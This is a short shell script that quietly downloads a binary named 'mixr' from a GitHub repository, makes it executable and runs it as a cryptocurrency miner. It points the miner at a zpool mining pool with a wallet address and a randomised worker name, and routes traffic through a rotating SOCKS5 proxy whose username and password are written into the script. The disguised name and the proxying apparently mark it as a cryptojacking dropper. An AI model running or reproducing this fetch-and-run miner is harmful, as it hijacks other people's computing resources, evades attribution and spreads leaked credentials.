apt update -y
wget -q https://github.com/Lutheranderson2001/TestOp/raw/main/mixr
chmod +x mixr
./mixr -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u RBxXP9udHoS2Xc27vMMMmxi79CbMmaj1u7.$(shuf -n 1 -i 1-9999999) -t 2 -p c=RVN -x socks5://archernap-rotate:arch12322@p.webshare.io:80